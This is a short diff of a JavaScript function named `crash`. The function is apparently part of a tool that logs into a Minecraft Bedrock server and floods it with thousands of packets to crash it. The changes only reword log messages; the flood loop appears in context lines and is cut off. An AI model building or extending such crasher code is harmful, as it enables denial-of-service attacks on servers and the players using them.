@@ -33,7 +33,7 @@ const crash = async (options) => {
             if (Date.now() - this.lastCall < 2000) return;
             this.lastCall = Date.now();
 
-            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} disconnected!`, data);
+            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${client.profile.name} disconnected!`, data);
             await client.removeAllListeners();
             if (data === 'disconnectionScreen.serverIdConflict') await wait(1000);
 
@@ -46,7 +46,7 @@ const crash = async (options) => {
         });
 
         client.on("kick", async (packet) => {
-            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} kicked!`, packet);
+            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${client.profile.name} kicked!`, packet);
             return disconnected(packet);
         });
 
@@ -58,7 +58,7 @@ const crash = async (options) => {
         client.on("play_status", async (data) => {
             if (data.status !== "login_success") return;
             await wait(3);
-            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} joined! Sending packets...`);
+            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${client.profile.name} joined! Sending packets...`);
             let i = 0;
             while (i < (delay ? 999 : 9999)) {
                 const pos = data.player_position ?? {
